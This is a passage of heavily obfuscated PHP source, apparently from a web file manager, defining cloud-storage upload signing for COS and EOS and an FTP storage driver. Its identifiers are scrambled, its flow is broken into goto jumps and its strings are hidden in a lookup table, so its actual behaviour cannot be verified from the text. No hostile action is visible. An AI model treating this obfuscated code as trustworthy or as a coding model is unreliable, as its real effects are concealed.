=> $dßç„ˆèÖç) { $cš›Œ©‹”” = $Fõ¥Ë’¬Ê[1171] . $eæØÒÇ¾Ì¶; $Cá½Ï¯ô… = LNG($cš›Œ©‹””); if ($cš›Œ©‹”” != $Cá½Ï¯ô…) { $eÄ™Ö§É§[$eæØÒÇ¾Ì¶][$Fõ¥Ë’¬Ê[28]] = $Cá½Ï¯ô…; } } return $eÄ™Ö§É§; } public static function transferType($fˆ¿å£­Û…, $a–¢õï„ŠÏ) { goto FÈ™°«Š–ë; FŠĞ©ÅŠ›: return $a³ïÓ‚­[1174]; goto a·¡Ğ²œ¨È; f“ÆØ„Äêë: if ($Aº†íŞ»áÄ[$a³ïÓ‚­[29]] == $aÕÍóá©Ûâ[$a³ïÓ‚­[29]] && $Aº†íŞ»áÄ[$a³ïÓ‚­[1172]] == $aÕÍóá©Ûâ[$a³ïÓ‚­[1172]]) { return $a³ïÓ‚­[1173]; } if ($Aº†íŞ»áÄ[$a³ïÓ‚­[29]] == $a³ïÓ‚­[824] && $aÕÍóá©Ûâ[$a³ïÓ‚­[29]] == $a³ïÓ‚­[106]) { return $a³ïÓ‚­[1084]; } if ($Aº†íŞ»áÄ[$a³ïÓ‚­[29]] == $a³ïÓ‚­[106] && $aÕÍóá©Ûâ[$a³ïÓ‚­[29]] == $a³ïÓ‚­[824]) { return $a³ïÓ‚­[107]; } goto FŠĞ©ÅŠ›; FÈ™°«Š–ë: $a³ïÓ‚­ =& $_SERVER[æ§›¦ÌáØ]; $Aº†íŞ»áÄ = self::driverType($fˆ¿å£­Û…); $aÕÍóá©Ûâ = self::driverType($a–¢õï„ŠÏ); goto f“ÆØ„Äêë; a·¡Ğ²œ¨È: } public static function driverType($A´£É‹Çæ½) { goto Fª²ªÄ—ò§; aÉ ò¸Ù: if ($C´êĞˆñÒ == $C¹õ³Ùù¡®[711] || $C´êĞˆñÒ == $C¹õ³Ùù¡®[1176] || $C´êĞˆñÒ == $C¹õ³Ùù¡®[1177]) { $A´£É‹Çæ½ = self::defaultDriverInit(); } else { if ($C´êĞˆñÒ == $C¹õ³Ùù¡®[1091] || $C´êĞˆñÒ == $C¹õ³Ùù¡®[1178]) { $A´£É‹Çæ½ = IO::init($A´£É‹Çæ½->pathParse[$C¹õ³Ùù¡®[1038]]); } } $C´êĞˆñÒ = str_replace($C¹õ³Ùù¡®[1175], $C¹õ³Ùù¡®[33], strtolower($A´£É‹Çæ½->getType())); if ($C´êĞˆñÒ == $C¹õ³Ùù¡®[106]) { return array($C¹õ³Ùù¡®[29] => $C¹õ³Ùù¡®[106], $C¹õ³Ùù¡®[1172] => $C¹õ³Ùù¡®[33], $C¹õ³Ùù¡®[76] => $Eö‰™òìÃ); } goto Cœ×„Úš¦Ä; Fª²ªÄ—ò§: $C¹õ³Ùù¡® =& $_SERVER[æ§›¦ÌáØ]; $Eö‰™òìÃ = $A´£É‹Çæ½->path; $C´êĞˆñÒ = str_replace($C¹õ³Ùù¡®[1175], $C¹õ³Ùù¡®[33], strtolower($A´£É‹Çæ½->getType())); goto aÉ ò¸Ù; Cœ×„Úš¦Ä: return array($C¹õ³Ùù¡®[29] => $C¹õ³Ùù¡®[824], $C¹õ³Ùù¡®[1172] => $A´£É‹Çæ½->pathDriver, $C¹õ³Ùù¡®[76] => $Eö‰™òìÃ); goto bÔçäÎæ¸„; bÔçäÎæ¸„: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($d¼ÈÅ‡áõ) { parent::__construct($d¼ÈÅ‡áõ); $this->signatureVersion($_SERVER[æ§›¦ÌáØ][212]); } public function uploadFormData($a„ôŸ’ˆ¶É, $EÂóİÖ Öá = 3600) { goto A»²õº°—š; F½ãôİ°“§: $aÈèƒĞ©µğ = $BĞÂ–¾Â[1179]; $f¾Æ“º¾Õ¹ = gmdate($BĞÂ–¾Â[1180], time() + $EÂóİÖ Öá); $få¨²Ô²è¡ = (string) time() . $BĞÂ–¾Â[68] . (string) (time() + $EÂóİÖ Öá); goto fõéÄò«ë; fäôŒùˆ¾ß: $dÓ­©©‘¤ = sha1($D™ãõÍ·á); $Bî·µ‘•’ = hash_hmac($BĞÂ–¾Â[230], $dÓ­©©‘¤, $C†„ù”™åá); $Dé›é¯à‚¸ = array($BĞÂ–¾Â[1183] => $F‚ÉÄ÷Ëò’, $BĞÂ–¾Â[1187] => $aÈèƒĞ©µğ, $BĞÂ–¾Â[1191] => base64_encode($D™ãõÍ·á), $BĞÂ–¾Â[1188] => $Bì³ÍéÔËÄ, $BĞÂ–¾Â[1189] => $this->accessKey, $BĞÂ–¾Â[1192] => $få¨²Ô²è¡, $BĞÂ–¾Â[1193] => $Bî·µ‘•’, $BĞÂ–¾Â[175] => $this->getHost()); goto eŒïåÃµ‘é; eŒïåÃµ‘é: return $Dé›é¯à‚¸; goto a•Œµ¶ºÜå; fõéÄò«ë: $D™ãõÍ·á = array($BĞÂ–¾Â[1181] => $f¾Æ“º¾Õ¹, $BĞÂ–¾Â[1182] => array(array($BĞÂ–¾Â[1183] => $F‚ÉÄ÷Ëò’), array($BĞÂ–¾Â[1184] => $this->bucket), array($BĞÂ–¾Â[1185], $BĞÂ–¾Â[1186], $BĞÂ–¾Â[33]), array($BĞÂ–¾Â[1187] => $aÈèƒĞ©µğ), array($BĞÂ–¾Â[1188] => $Bì³ÍéÔËÄ), array($BĞÂ–¾Â[1189] => $this->accessKey), array($BĞÂ–¾Â[1190] => $få¨²Ô²è¡))); $D™ãõÍ·á = json_encode($D™ãõÍ·á); $C†„ù”™åá = hash_hmac($BĞÂ–¾Â[230], $få¨²Ô²è¡, $this->secret); goto fäôŒùˆ¾ß; A»²õº°—š: $BĞÂ–¾Â =& $_SERVER[æ§›¦ÌáØ]; $F‚ÉÄ÷Ëò’ = $BĞÂ–¾Â[192]; $Bì³ÍéÔËÄ = $BĞÂ–¾Â[230]; goto F½ãôİ°“§; a•Œµ¶ºÜå: } public function fileOutLink($fÈ™ŞÅ¡â) { $b¾®µÂ½¦ =& $_SERVER[æ§›¦ÌáØ]; if (substr($fÈ™ŞÅ¡â, 0, 7) == $b¾®µÂ½¦[1194]) { $fÈ™ŞÅ¡â = $b¾®µÂ½¦[1195] . substr($fÈ™ŞÅ¡â, 7); } header($b¾®µÂ½¦[159] . $fÈ™ŞÅ¡â); die; } } goto c¦Ê„¾ˆäÎ; EÅËª®ø²…: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($f‚ç¿Çš­ğ) { parent::__construct($f‚ç¿Çš­ğ); $this->signatureVersion($_SERVER[æ§›¦ÌáØ][212]); } public function uploadFormData($bÈƒ†ºÑğ, $cÖì¬ôê¤˜ = 3600) { goto C«ÁÑò’¹ñ; böÙ­Å–”«: $F¢Õ¾ÏÒÛì = hash_hmac($BŒŠğÙé·³[1224], $EÀ¡Òšâ§Ç, $aÇºÆÈ½ˆ, !0); $f¾¥·»ÀÖª = hash_hmac($BŒŠğÙé·³[1224], $A³›ìäêÁ, $F¢Õ¾ÏÒÛì, !0); $Eó“‰­Î¯à = hash_hmac($BŒŠğÙé·³[1224], $d‹èÔ«ÀÏÊ, $f¾¥·»ÀÖª); goto a¡Çê†Ôµ–; FÕª›°÷–: $CŞïÁÜñ¥Ğ = array($this->accessKey, $FÖ¹ÚªÔ–é, $this->region, $EÀ¡Òšâ§Ç, $A³›ìäêÁ); $EÆ„®‘³­ = implode($BŒŠğÙé·³[8], $CŞïÁÜñ¥Ğ); $EÚìíŸÈ™Ã = array($BŒŠğÙé·³[1181] => gmdate($BŒŠğÙé·³[1180], strtotime($BŒŠğÙé·³[1217])), $BŒŠğÙé·³[1182] => array(array($BŒŠğÙé·³[1184] => $this->bucket), array($BŒŠğÙé·³[1183] => $Cõ‡¾ãô), array($BŒŠğÙé·³[1185], $BŒŠğÙé·³[1186], $BŒŠğÙé·³[33]), array($BŒŠğÙé·³[1185], $BŒŠğÙé·³[1218], $BŒŠğÙé·³[33]), array($BŒŠğÙé·³[1185], $BŒŠğÙé·³[1219], $BŒŠğÙé·³[33]), array($BŒŠğÙé·³[1187] => $aàöÄöâòø), array($BŒŠğÙé·³[1220] => $EÆ„®‘³­), array($BŒŠğÙé·³[1221] => $b‚ŒØÒ‘Ìƒ), array($BŒŠğÙé·³[1222] => $C•á³²‚ö÷), array($BŒŠğÙé·³[1223] => $EŒÛŠ†é˜‘))); goto B»¼Ê³†Š; a¡Çê†Ôµ–: $FŞŸŸ¨òÙ¶ = array($BŒŠğÙé·³[211] => $BŒŠğÙé·³[33], $BŒŠğÙé·³[1226] => $BŒŠğÙé·³[33], $BŒŠğÙé·³[1183] => $Cõ‡¾ãô, $BŒŠğÙé·³[1187] => $aàöÄöâòø, $BŒŠğÙé·³[1191] => $d‹èÔ«ÀÏÊ, $BŒŠğÙé·³[1227] => $EÆ„®‘³­, $BŒŠğÙé·³[1228] => $b‚ŒØÒ‘Ìƒ, $BŒŠğÙé·³[1229] => $C•á³²‚ö÷, $BŒŠğÙé·³[1230] => $EŒÛŠ†é˜‘, $BŒŠğÙé·³[1231] => $Eó“‰­Î¯à, $BŒŠğÙé·³[175] => $this->getHost()); return $FŞŸŸ¨òÙ¶; goto AØÖÒ±´Šø; Dœ»Ò´½Šê: $A³›ìäêÁ = $BŒŠğÙé·³[1216]; $EŒÛŠ†é˜‘ = $cÖì¬ôê¤˜ . $BŒŠğÙé·³[33]; $aàöÄöâòø = $BŒŠğÙé·³[1179]; goto FÕª›°÷–; C«ÁÑò’¹ñ: $BŒŠğÙé·³ =& $_SERVER[æ§›¦ÌáØ]; $Cõ‡¾ãô = $BŒŠğÙé·³[192]; $b‚ŒØÒ‘Ìƒ = $BŒŠğÙé·³[1214]; goto C¢Ú¿ÀÉŠ; C¢Ú¿ÀÉŠ: $EÀ¡Òšâ§Ç = $BŒŠğÙé·³[59]; $C•á³²‚ö÷ = gmdate($BŒŠğÙé·³[1215]); $FÖ¹ÚªÔ–é = gmdate($BŒŠğÙé·³[704]); goto Dœ»Ò´½Šê; B»¼Ê³†Š: $d‹èÔ«ÀÏÊ = base64_encode(json_encode($EÚìíŸÈ™Ã)); $a“®·†¦ˆ… = hash_hmac($BŒŠğÙé·³[1224], $FÖ¹ÚªÔ–é, $BŒŠğÙé·³[1225] . $this->secret, !0); $aÇºÆÈ½ˆ = hash_hmac($BŒŠğÙé·³[1224], $this->region, $a“®·†¦ˆ…, !0); goto böÙ­Å–”«; AØÖÒ±´Šø: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($Fãï¹¥°¹) { parent::__construct(); if (count($Fãï¹¥°¹) > 0) { $this->_init($Fãï¹¥°¹); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Bóááñ×İ) { $a¤”Ğî´¦è =& $_SERVER[æ§›¦ÌáØ]; global $config; $this->appCharset = $config[$a¤”Ğî´¦è[1232]]; $this->systemCharset = $config[$a¤”Ğî´¦è[1233]]; if (isset($Bóááñ×İ[$a¤”Ğî´¦è[1234]]) && $Bóááñ×İ[$a¤”Ğî´¦è[1234]]) { $this->systemCharset = $Bóááñ×İ[$a¤”Ğî´¦è[1234]]; } } public function iconvApp($dØŒ¬ì™¾Û) { return $this->iconvTo($dØŒ¬ì™¾Û, $this->systemCharset, $this->appCharset); } public function iconvSystem($bÇÇÛƒºÆ) { return $this->iconvTo($bÇÇÛƒºÆ, $this->appCharset, $this->systemCharset); } public function getPathOuter($C·Á ¯×Ì) { goto B—’¦¯ºØó; a…ê£×Éô: return $this->pathDriver . $dÃÀÄÆÅ‹[8] . ltrim($C·Á ¯×Ì, $dÃÀÄÆÅ‹[8]); goto EÎÓå÷¬µ; B—’¦¯ºØó: $dÃÀÄÆÅ‹ =& $_SERVER[æ§›¦ÌáØ]; $F®¸Ì±ï»É = $this->iconvApp($this->pathBase); $C·Á ¯×Ì = $this->iconvApp($C·Á ¯×Ì); goto C¤á©…™¿Ñ; c°ŸİÔ–·: $C·Á ¯×Ì = KodIO::clear($C·Á ¯×Ì); $C·Á ¯×Ì = substr($C·Á ¯×Ì, strlen($F®¸Ì±ï»É)); if (empty($this->pathDriver)) { return $C·Á ¯×Ì; } goto a…ê£×Éô; C¤á©…™¿Ñ: if (substr($F®¸Ì±ï»É, 0, 2) == $dÃÀÄÆÅ‹[1235]) { $F®¸Ì±ï»É = BASIC_PATH . substr($F®¸Ì±ï»É, 2); } if (substr($C·Á ¯×Ì, 0, 2) == $dÃÀÄÆÅ‹[1235]) { $C·Á ¯×Ì = BASIC_PATH . substr($C·Á ¯×Ì, 2); } $F®¸Ì±ï»É = KodIO::clear($F®¸Ì±ï»É); goto c°ŸİÔ–·; EÎÓå÷¬µ: } private function _init($CÔš¬ØíËÕ = array()) { $fõœ±ˆìÇ„ =& $_SERVER[æ§›¦ÌáØ]; if (!function_exists($fõœ±ˆìÇ„[1236])) { throw new Exception(LNG($fõœ±ˆìÇ„[1237])); } $this->config = $CÔš¬ØíËÕ; $this->charsetReset($CÔš¬ØíËÕ); foreach ($CÔš¬ØíËÕ as $BÏ°‘Šø‚† => $aÂšö§ì½) { if (isset($this->{$BÏ°‘Šø‚†})) { $this->{$BÏ°‘Šø‚†} = $aÂšö§ì½; } } return $this->_login($CÔš¬ØíËÕ); } private function _login($cë©åÙ©ì¹) { goto fÎ¼²§”Ãá; fÎ¼²§”Ãá: $Få£Ê¾ï =& $_SERVER[æ§›¦ÌáØ]; static $CÍíØ¸‰ = array(); $bÆôØ³¸ææ = md5(json_encode($cë©åÙ©ì¹)); goto A†Ê¿©½Ïô; A‚†¬Ö´©ª: $CÍíØ¸‰[$bÆôØ³¸ææ] = array($Få£Ê¾ï[1241] => $this->connect, $Få£Ê¾ï[175] => $this->host, $Få£Ê¾ï[174] => $this->scheme, $Få£Ê¾ï[176] => $this->port); return $eÄåÆˆá¥ñ; goto eáÒ†ÕëÁ; f¶êïíë‚«: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $eÄåÆˆá¥ñ = @ftp_login($this->connect, $this->username, $this->userpass); goto CÕÑ¢øÙ§†; CÕÑ¢øÙ§†: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $EÚñÈ£·î = $this->pasv == $Få£Ê¾ï[87] ? !0 : !1; @ftp_pasv($this->connect, $EÚñÈ£·î); goto A‚†¬Ö´©ª; C¹ğ¥´ƒ¤í: $B¡ÀØ›„¾‘ = isset($b°µèğÑ›[$Få£Ê¾ï[174]]) && $b°µèğÑ›[$Få£Ê¾ï[174]] == $Få£Ê¾ï[1238] ? !0 : !1; $this->scheme = $B¡ÀØ›„¾‘ ? $Få£Ê¾ï[1239] : $Få£Ê¾ï[1240]; $this->port = isset($b°µèğÑ›[$Få£Ê¾ï[176]]) ? $b°µèğÑ›[$Få£Ê¾ï[176]] : 21; goto f¶êïíë‚«; A†Ê¿©½Ïô: if (isset($CÍíØ¸‰[$bÆôØ³¸ææ])) { foreach ($CÍíØ¸‰[$bÆôØ³¸ææ] as $b†Œ˜çÀ => $cÂ’ôâ¾Á) { $this->{$b†Œ˜çÀ} = $cÂ’ôâ¾Á; } return !0; } $b°µèğÑ› = parse_url(trim($this->server, $Få£Ê¾ï[8])); $this->host = $b°µèğÑ›[$Få£Ê¾ï[175]]; goto C¹ğ¥´ƒ¤í; eáÒ†ÕëÁ: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($bù“¦˜§Ë•, $FÑ¥­‚Î½ô = '', $F»µ©£¶ÖÚ = REPEAT_RENAME) { if ($this->setContent($bù“¦˜§Ë•, $FÑ¥­‚Î½ô)) { return $this->getPathOuter($bù“¦˜§Ë•); } return !1; } public function mkdir($Dòõå˜ùñ³, $b±Á˜ğª˜ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $Dòõå˜ùñ³ = $this->iconvSystem($Dòõå˜ùñ³); if ($this->_isFolder($Dòõå˜ùñ³) || @ftp_mkdir($this->connect, $Dòõå˜ùñ³)) { return $this->getPathOuter($Dòõå˜ùñ³); } if (!$this->mkdir($this->pathFather($Dòõå˜ùñ³))) { return !1; } if ($Dòõå˜ùñ³ = @ftp_mkdir($this->connect, $Dòõå˜ùñ³)) { return $this->getPathOuter($Dòõå˜ùñ³); } return !1; } public function copyFile($a‘¸‡»ïè, $e”ËÅÀŒ‹) { goto dµÒ¥Çµº; C¡•ˆøÔ‹¦: $this->tempFileRemve($E‰˜¡øá ·); return $dÚ¬ÕÀ¼øƒ; goto eêíé±áêÆ; CĞ•ŸçÙÛš: $E³ª¡’‹ƒ· = $this->iconvApp($E‰˜¡øá ·); $this->download($a‘¸‡»ïè, $E³ª¡’‹ƒ·); $dÚ¬ÕÀ¼øƒ = $this->upload($e”ËÅÀŒ‹, $E³ª¡’‹ƒ·); goto C¡•ˆøÔ‹¦; dµÒ¥Çµº: if (!$this->_isconn()) { return !1; } $A’æÇ¯Î¥ˆ = $this->pathThis($this->iconvSystem($a‘¸‡»ïè)); $E‰˜¡øá · = $this->tempFile($A’æÇ¯Î¥ˆ); goto CĞ•ŸçÙÛš; eêíé±áêÆ: } public function moveFile($f…–Í÷ğÃ, $c˜â´áõº) { if (!$this->_isconn()) { return !1; } $f…–Í÷ğÃ = $this->iconvSystem($f…–Í÷ğÃ); $c˜â´áõº = $this->iconvSystem($c˜â´áõº); $bŒ°£ŠŒ’Ì = @ftp_rename($this->connect, $f…–Í÷ğÃ, $c˜â´áõº); return $bŒ°£ŠŒ’Ì ? $this->getPathOuter($c˜â´áõº) : !1; } public function delFile($a¯ÕèÕ½óÓ) { if (!$this->_isconn()) { return !1; } $a¯ÕèÕ½óÓ = $this->iconvSystem($a¯ÕèÕ½óÓ); return @ftp_delete($this->connect, $a¯ÕèÕ½óÓ); } public function delFolder($B¢äÔô”) { goto aíçÅÀèÑº; eÜ…Çîç†ù: foreach ($bÑ™Š‡ãÆË as $EÌÌæ¶š§å) { $EÌÌæ¶š§å = $this->iconvSystem($EÌÌæ¶š§å); $d­ßÒÛîÊ» = @ftp_rmdir($this->connect, $EÌÌæ¶š§å); if (!$d­ßÒÛîÊ») { return !1; } } $B¢äÔô” = $this->iconvSystem($B¢äÔô”); return @ftp_rmdir($this->connect, $B¢äÔô”); goto d‘Ïñçñ¼; aíçÅÀèÑº: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $bÑ™Š‡ãÆË = $e‡¨¶«­ÑÀ = array(); goto E„±ˆÓñ“; E„±ˆÓñ“: $this->fileList($B¢äÔô”, $bÑ™Š‡ãÆË, $e‡¨¶«­ÑÀ, !0); $this->listItemCache = !0; foreach ($e‡¨¶«­ÑÀ as $A‹— â­‹©) { $EÌÌæ¶š§å = $this->iconvSystem($A‹— â­‹©[$_SERVER[æ§›¦ÌáØ][28]]); $d­ßÒÛîÊ» = @ftp_delete($this->connect, $EÌÌæ¶š§å); if (!$d­ßÒÛîÊ») { return !1; } } goto eÜ…Çîç†ù; d‘Ïñçñ¼: } public function rename($BŒ¶Ö–¿ƒå, $CÎğÔ—Ù«ù) { goto cŞß¨ë¡‘ğ; B¼¬”ì›œ«: $Fàå¨øé›ğ = $this->iconvSystem($Fàå¨øé›ğ); $BŒ¶Ö–¿ƒå = $this->iconvSystem($BŒ¶Ö–¿ƒå); $A£†„¹Ğå = $this->pathFather($BŒ¶Ö–¿ƒå); goto fÉÂè½¦İÊ; cŞß¨ë¡‘ğ: $CË¸ß÷²Íª =& $_SERVER[æ§›¦ÌáØ]; if (!$this->_isconn()) { return !1; } $Fàå¨øé›ğ = $this->fileNameAuto($this->pathFather($BŒ¶Ö–¿ƒå), $CÎğÔ—Ù«ù); goto B¼¬”ì›œ«; F¾“°¸¦ë¡: return $B³ÙÈ…Šñ ? $this->getPathOuter($AöÔİĞÏ‡Ø) : !1; goto D‘ÌÒŠ¨ˆ’; fÉÂè½¦İÊ: $AöÔİĞÏ‡Ø = rtrim($A£†„¹Ğå, $CË¸ß÷²Íª[8]) . $CË¸ß÷²Íª[8] . $Fàå¨øé›ğ; $B³ÙÈ…Šñ = @ftp_rename($this->connect, $BŒ¶Ö–¿ƒå, $AöÔİĞÏ‡Ø); $AöÔİĞÏ‡Ø = $this->iconvApp($AöÔİĞÏ‡Ø); goto F¾“°¸¦ë¡; D‘ÌÒŠ¨ˆ’: } private function folderInfo($e«ùŒŸàªğ, $AÃÍ¯è±ñ± = false) { $eÖ¢õ±Å§ =& $_SERVER[æ§›¦ÌáØ]; $eÔ¯ŞˆÀò = array($eÖ¢õ±Å§[28] => $this->pathThis($e«ùŒŸàªğ), $eÖ¢õ±Å§[76] => $this->getPathOuter($eÖ¢õ±Å§[8] . $e«ùŒŸàªğ), $eÖ¢õ±Å§[29] => $eÖ¢õ±Å§[77]); if ($AÃÍ¯è±ñ±) { return $eÔ¯ŞˆÀò; } $eÔ¯ŞˆÀò[$eÖ¢õ±Å§[194]] = $eÔ¯ŞˆÀò[$eÖ¢õ±Å§[84]] = 0; $eÔ¯ŞˆÀò[$eÖ¢õ±Å§[195]] = $eÔ¯ŞˆÀò[$eÖ¢õ±Å§[196]] = !0; return $eÔ¯ŞˆÀò; } private function fileInfo($d‘Ü ÅòÚâ, $CÆ†®‰ÛŠ = false, $Fà’öé ÅÏ = array()) { goto dì×‹Íšñ”; dì×‹Íšñ”: $CãÔ¼š×å© =& $_SERVER[æ§›¦ÌáØ]; $Eƒµ½“¨Íí = array($CãÔ¼š×å©[28] => $this->pathThis($d‘Ü ÅòÚâ), $CãÔ¼š×å©[76] => $this->getPathOuter($CãÔ¼š×å©[8] . $d‘Ü ÅòÚâ), $CãÔ¼š×å©[29] => $CãÔ¼š×å©[193], $CãÔ¼š×å©[78] => isset($Fà’öé ÅÏ[$CãÔ¼š×å©[78]]) ? $Fà’öé ÅÏ[$CãÔ¼š×å©[78]] : 0, $CãÔ¼š×å©[168] => $this->ext($d‘Ü ÅòÚâ)); if ($CÆ†®‰ÛŠ) { return $Eƒµ½“¨Íí; } goto D°œÌ¸ÏéÔ; bïõšâ—ø‰: $Eƒµ½“¨Íí[$CãÔ¼š×å©[84]] = @ftp_mdtm($this->connect, $e•«ˆš‹ä¤); if (empty($Fà’öé ÅÏ)) { $Fà’öé ÅÏ = $this->objectMeta($d‘Ü ÅòÚâ); if (!$Fà’öé ÅÏ) { return $Eƒµ½“¨Íí; } } $Eƒµ½“¨Íí[$CãÔ¼š×å©[78]] = $Fà’öé ÅÏ[$CãÔ¼š×å©[78]]; goto FÁÉÌ×‚ô÷; D°œÌ¸ÏéÔ: $Eƒµ½“¨Íí[$CãÔ¼š×å©[194]] = $Eƒµ½“¨Íí[$CãÔ¼š×å©[84]] = 0; $Eƒµ½“¨Íí[$CãÔ¼š×å©[195]] = $Eƒµ½“¨Íí[$CãÔ¼š×å©[196]] = !0; $e•«ˆš‹ä¤ = $this->iconvSystem($d‘Ü ÅòÚâ); goto bïõšâ—ø‰; FÁÉÌ×‚ô÷: return $Eƒµ½“¨Íí; goto BÆŞŠ¥×¾£; BÆŞŠ¥×¾£: } public function size($DÒªåØ‚„æ) { $fÈµ±İÕ½ = $this->objectMeta($DÒªåØ‚„æ); return $fÈµ±İÕ½ ? $fÈµ±İÕ½[$_SERVER[æ§›¦ÌáØ][78]] : 0; } public function info($d¡öªòõ) { if ($this->isFile($d¡öªòõ)) { return $this->fileInfo($d¡öªòõ, 0); } else { if ($this->isFolder($d¡öªòõ)) { return $this->folderInfo($d¡öªòõ); } } return !1; } private function fileList($E˜”«ìİ¯, &$e¨ªÉ­´”¼, &$Eãêñø¾»ù, $C©’Ùç›Ãä = false) { goto f¿‘¿ã¥ÅÑ; D”¥èÛÆåÃ: $EßİÑÈ ø· = array($bË¯Èºù…§[95] => 1, $bË¯Èºù…§[1242] => 1); foreach ($e†ëÜŠ…Â¾ as $eÛœÉã·Ö) { goto b‡™„‚¶ïµ; B©²È¹Œ: if (empty($F¦ºŠêß²‹) && $F¦ºŠêß²‹ !== $bË¯Èºù…§[191] || isset($EßİÑÈ ø·[$F¦ºŠêß²‹])) { continue; } $F¦ºŠêß²‹ = $this->iconvApp($E˜”«ìİ¯ . ltrim($F¦ºŠêß²‹, $bË¯Èºù…§[8])); $a…Å„ÙòµÌ = array($bË¯Èºù…§[28] => $F¦ºŠêß²‹, $bË¯Èºù…§[29] => $bË¯Èºù…§[193], $bË¯Èºù…§[78] => $BœæÈ‚ß·Ò[4]); goto e¹‰ê‡ˆ©ç; fÙ¦«¾Ë­: if ($a„Æôèèã¯) { $e¨ªÉ­´”¼[] = $F¦ºŠêß²‹; if ($C©’Ùç›Ãä) { $this->fileList($F¦ºŠêß²‹, $e¨ªÉ­´”¼, $Eãêñø¾»ù, $C©’Ùç›Ãä); } continue; } $Eãêñø¾»ù[] = $a…Å„ÙòµÌ; goto D÷Óµ¼…‡ƒ; b‡™„‚¶ïµ: $BœæÈ‚ß·Ò = $this->_listItem($eÛœÉã·Ö); if ($BœæÈ‚ß·Ò[0] == $bË¯Èºù…§[712]) { continue; } $F¦ºŠêß²‹ = $BœæÈ‚ß·Ò[8]; goto B©²È¹Œ; e¹‰ê‡ˆ©ç: if (substr($eÛœÉã·Ö, 0, 1) == $bË¯Èºù…§[1243]) { $a…Å„ÙòµÌ[$bË¯Èºù…§[29]] = $bË¯Èºù…§[77]; $a…Å„ÙòµÌ[$bË¯Èºù…§[78]] = 0; } $a„Æôèèã¯ = $a…Å„ÙòµÌ[$bË¯Èºù…§[29]] == $bË¯Èºù…§[77] ? !0 : !1; if ($a“»Ú¬‹¿) { $this->cacheMethod($bË¯Èºù…§[199], $F¦ºŠêß²‹, $a„Æôèèã¯); $this->cacheMethod($bË¯Èºù…§[200], $F¦ºŠêß²‹, $a…Å„ÙòµÌ); } goto fÙ¦«¾Ë­; D÷Óµ¼…‡ƒ: } if ($a“»Ú¬‹¿) { $this->cacheMethod($bË¯Èºù…§[199], $E˜”«ìİ¯, !0); } goto b¯ÊÑ÷Ì°; f¿‘¿ã¥ÅÑ: $bË¯Èºù…§ =& $_SERVER[æ§›¦ÌáØ]; $E˜”«ìİ¯ = $this->iconvSystem($E˜”«ìİ¯); if (!$this->isFolder($E˜”«ìİ¯)) { return !1; } goto Fâ°…ÍÒˆó; dî«¨…ŠÅ: $a“»Ú¬‹¿ = $this->listItemCache === !1 ? !1 : !0; $e†ëÜŠ…Â¾ = @ftp_rawlist($this->connect, $E˜”«ìİ¯); if (!$e†ëÜŠ…Â¾) { $e†ëÜŠ…Â¾ = array(); } goto D”¥èÛÆåÃ; Fâ°…ÍÒˆó: @ftp_chdir($this->connect, $bË¯Èºù…§[8]); $E˜”«ìİ¯ = rtrim($E˜”«ìİ¯, $bË¯Èºù…§[8]) . $bË¯Èºù…§[8]; check_abort(); goto dî«¨…ŠÅ; b¯ÊÑ÷Ì°: } private function _listItem($E•ªÚŠŸô) { if (empty($E•ªÚŠŸô)) { return array(); } $f×˜Ø”Ïô… = preg_split($_SERVER[æ§›¦ÌáØ][1244], $E•ªÚŠŸô); if (count($f×˜Ø”Ïô…) <= 9) { return $f×˜Ø”Ïô…; } $f×˜Ø”Ïô…[8] = trim(substr($E•ªÚŠŸô, strpos($E•ªÚŠŸô, $f×˜Ø”Ïô…[7]) + strlen($f×˜Ø”Ïô…[7]))); return array_splice($f×˜Ø”Ïô…, 0, 9); } public function listPath($Bˆ†‰›î÷‹, $bã†”‘¾èœ = false) { goto dëøåøÏªæ; C²“§ùï™¤: $this->fileList($Bˆ†‰›î÷‹, $Føİ‚ìˆ¿³, $D¢ŸÍ¬ê¼); foreach ($Føİ‚ìˆ¿³ as $fĞ£ƒÚ²Èñ => $Fß‡ç©ãÅ±) { $Føİ‚ìˆ¿³[$fĞ£ƒÚ²Èñ] = $this->folderInfo($Fß‡ç©ãÅ±, $bã†”‘¾èœ); } foreach ($D¢ŸÍ¬ê¼ as $fĞ£ƒÚ²Èñ => $Fß‡ç©ãÅ±) { $D¢ŸÍ¬ê¼[$fĞ£ƒÚ²Èñ] = $this->fileInfo($Fß‡ç©ãÅ±[$c†™‡Ì‰¶[28]], $bã†”‘¾èœ, $Fß‡ç©ãÅ±); } goto EÊ’¥¯œäì; dëøåøÏªæ: $c†™‡Ì‰¶ =& $_SERVER[æ§›¦ÌáØ]; if (!$this->_isconn()) { return !1; } $Føİ‚ìˆ¿³ = $D¢ŸÍ¬ê¼ = array(); goto C²“§ùï™¤; EÊ’¥¯œäì: return array($c†™‡Ì‰¶[75] => $Føİ‚ìˆ¿³, $c†™‡Ì‰¶[74] => $D¢ŸÍ¬ê¼); goto C¤¶à½É; C¤¶à½É: } public function has($dëÔÂ²Éáğ, $eÆ¼¦ƒ = false, $fÓ…Ê•Ïáæ = true) { goto dùŞïÓğğ´; EºŞãÏÇ”—: $this->fileList($dëÔÂ²Éáğ, $eÛïÓ–Ÿ£­, $e…¶¾ĞĞí¸, $cÄœ­òİ½); if ($eÆ¼¦ƒ) { return array($c¨áîò¼ƒ[203] => count($e…¶¾ĞĞí¸), $c¨áîò¼ƒ[204] => count($eÛïÓ–Ÿ£­)); } if ($fÓ…Ê•Ïáæ) { if (count($e…¶¾ĞĞí¸)) { return !0; } } else { if (count($eÛïÓ–Ÿ£­)) { return !0; } } goto DËÍ»ÁêÌ; DËÍ»ÁêÌ: return !1; goto bíøì˜—½; dùŞïÓğğ´: $c¨áîò¼ƒ =& $_SERVER[æ§›¦ÌáØ]; $eÛïÓ–Ÿ£­ = $e…¶¾ĞĞí¸ = array(); $cÄœ­òİ½ = $eÆ¼¦ƒ ? !0 : !1; goto EºŞãÏÇ”—; 